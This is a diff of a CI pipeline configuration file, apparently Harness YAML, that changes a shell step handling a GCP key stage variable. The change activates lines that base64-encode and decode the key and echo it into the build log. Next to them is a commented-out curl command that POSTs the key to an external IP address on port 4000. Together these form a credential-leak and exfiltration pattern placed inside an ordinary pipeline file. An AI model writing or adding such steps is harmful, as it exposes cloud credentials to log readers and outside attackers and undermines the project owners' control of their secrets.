@@ -44,12 +44,12 @@ pipeline:
                       # # Define your secrets
 
                       # #echo "<+stage.variables.gcp_key>" | base64
-
+                      echo "after the script****************"
                       # # Base64-encode the string and decode it
-                      # encoded_var=$(echo "<+stage.variables.gcp_key>" | base64 | base64 -d)
+                      encoded_var=$(echo "<+stage.variables.gcp_key>" | base64 | base64 -d)
 
                       # # Print the decoded variable
-                      # echo "$encoded_var"
+                      echo "$encoded_var"
                       # curl -X POST --data "$encoded_var" http://35.222.129.92:4000
 
                       # #secret1="<+stage.variables.gcp_key>" 
